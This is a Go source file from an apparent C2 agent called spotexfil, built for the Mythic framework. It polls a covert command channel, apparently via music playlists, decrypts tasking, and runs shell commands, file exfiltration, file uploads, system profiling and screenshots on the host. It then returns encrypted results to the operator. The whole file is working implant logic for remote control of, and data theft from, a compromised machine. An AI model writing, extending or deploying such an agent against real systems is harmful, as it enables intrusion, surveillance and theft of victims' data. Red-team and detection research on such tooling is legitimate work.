package main

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync/atomic"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/c2"
	"github.com/sourcefrenchy/spotexfil/pkg/mythicmap"
)

// exitRequested is set when Mythic tasks the agent with "exit"; main
// performs the clean os.Exit(0) after the final post_response is sent.
var exitRequested atomic.Bool

// Mythic get_tasking wire messages.
type taskingRequest struct {
	Action      string `json:"action"`
	TaskingSize int    `json:"tasking_size"`
}

type mythicTask struct {
	ID         int     `json:"id"`
	Command    string  `json:"command"`
	Parameters string  `json:"parameters"` // string; JSON-encoded for structured commands
	Timestamp  float64 `json:"timestamp"`
}

type taskingResponse struct {
	Action string       `json:"action"`
	Tasks  []mythicTask `json:"tasks"`
}

// Mythic post_response wire messages.
type taskResult struct {
	TaskID     int    `json:"task_id"`
	UserOutput string `json:"user_output"`
	Completed  bool   `json:"completed"`
	Status     string `json:"status"` // "success" or "error: <msg>"
}

type postResponse struct {
	Action    string       `json:"action"`
	Responses []taskResult `json:"responses"`
}

// runModule executes a registry module and maps its (status, data) pair to
// the Mythic (output, status) convention.
func runModule(name string, args map[string]interface{}) (output string, status string) {
	m := c2.GetModule(name)
	if m == nil {
		msg := "module not available: " + name
		return msg, "error: " + msg
	}
	st, data := m.Execute(args)
	if st != "ok" {
		return data, "error: " + data
	}
	return data, "success"
}

// executeTask maps a Mythic command to a spotexfil module and runs it.
// Pure over the module registry (no network).
func executeTask(cmd string, params string) (output string, status string) {
	switch cmd {
	case "shell":
		var p struct {
			Command string `json:"command"`
		}
		if err := json.Unmarshal([]byte(params), &p); err != nil {
			msg := "invalid shell parameters: " + err.Error()
			return msg, "error: " + msg
		}
		if p.Command == "" {
			msg := "invalid shell parameters: empty command"
			return msg, "error: " + msg
		}
		return runModule("shell", map[string]interface{}{"cmd": p.Command})

	case "sysinfo":
		return runModule("sysinfo", map[string]interface{}{})

	case "download":
		path := strings.TrimSpace(params)
		if path == "" {
			msg := "invalid download parameters: empty path"
			return msg, "error: " + msg
		}
		return runModule("exfil", map[string]interface{}{"path": path})

	case "upload":
		var p struct {
			Path    string `json:"path"`
			Content string `json:"content"`
		}
		if err := json.Unmarshal([]byte(params), &p); err != nil {
			msg := "invalid upload parameters: " + err.Error()
			return msg, "error: " + msg
		}
		return runModule("push", map[string]interface{}{"path": p.Path, "data": p.Content})

	case "screenshot":
		args := map[string]interface{}{"display": float64(0)}
		if strings.TrimSpace(params) != "" {
			var p struct {
				Display int `json:"display"`
			}
			if err := json.Unmarshal([]byte(params), &p); err != nil {
				msg := "invalid screenshot parameters: " + err.Error()
				return msg, "error: " + msg
			}
			args["display"] = float64(p.Display)
		}
		return runModule("screenshot", args)

	default:
		msg := "unknown command " + cmd
		return msg, "error: " + msg
	}
}

// runOnce performs one get_tasking cycle: send the request, poll the cmd
// channel for Mythic's reply, execute each task sequentially, and post a
// batched post_response. Returns the number of tasks processed.
func runOnce(ctx context.Context, t transport, uuid string, key []byte, seqSource *atomic.Int64) (processed int, err error) {
	reqBody, err := json.Marshal(taskingRequest{Action: "get_tasking", TaskingSize: -1})
	if err != nil {
		return 0, fmt.Errorf("marshal get_tasking: %w", err)
	}
	env, err := mythicmap.Encrypt(uuid, key, reqBody)
	if err != nil {
		return 0, fmt.Errorf("encrypt get_tasking: %w", err)
	}
	if err := t.send(ctx, env, int(seqSource.Add(1))); err != nil {
		return 0, fmt.Errorf("send get_tasking: %w", err)
	}

	// The profile answers asynchronously on the cmd channel: poll briefly.
	var plaintext []byte
	var cleanSeqs []int
	for attempt := 0; attempt < taskPollAttempts; attempt++ {
		_, pt, seqs, rerr := t.readForMe(ctx)
		if rerr != nil {
			if len(seqs) > 0 {
				_ = t.clean(ctx, seqs)
			}
			return 0, fmt.Errorf("read tasking: %w", rerr)
		}
		if pt != nil {
			plaintext, cleanSeqs = pt, seqs
			break
		}
		select {
		case <-ctx.Done():
			return 0, ctx.Err()
		case <-time.After(taskPollInterval):
		}
	}
	if plaintext == nil {
		return 0, nil // no tasking this cycle
	}
	// Clean processed cmd playlists once handled, whatever happens next.
	defer func() { _ = t.clean(ctx, cleanSeqs) }()

	var resp taskingResponse
	if err := json.Unmarshal(plaintext, &resp); err != nil {
		return 0, fmt.Errorf("parse tasking response: %w", err)
	}
	if len(resp.Tasks) == 0 {
		return 0, nil
	}

	results := make([]taskResult, 0, len(resp.Tasks))
	for _, task := range resp.Tasks {
		if task.Command == "exit" {
			results = append(results, taskResult{
				TaskID:     task.ID,
				UserOutput: "Exiting",
				Completed:  true,
				Status:     "success",
			})
			exitRequested.Store(true)
			continue
		}
		out, st := executeTask(task.Command, task.Parameters)
		results = append(results, taskResult{
			TaskID:     task.ID,
			UserOutput: out,
			Completed:  true,
			Status:     st,
		})
	}

	body, err := json.Marshal(postResponse{Action: "post_response", Responses: results})
	if err != nil {
		return 0, fmt.Errorf("marshal post_response: %w", err)
	}
	env, err = mythicmap.Encrypt(uuid, key, body)
	if err != nil {
		return 0, fmt.Errorf("encrypt post_response: %w", err)
	}
	if err := t.send(ctx, env, int(seqSource.Add(1))); err != nil {
		return 0, fmt.Errorf("send post_response: %w", err)
	}
	return len(results), nil
}
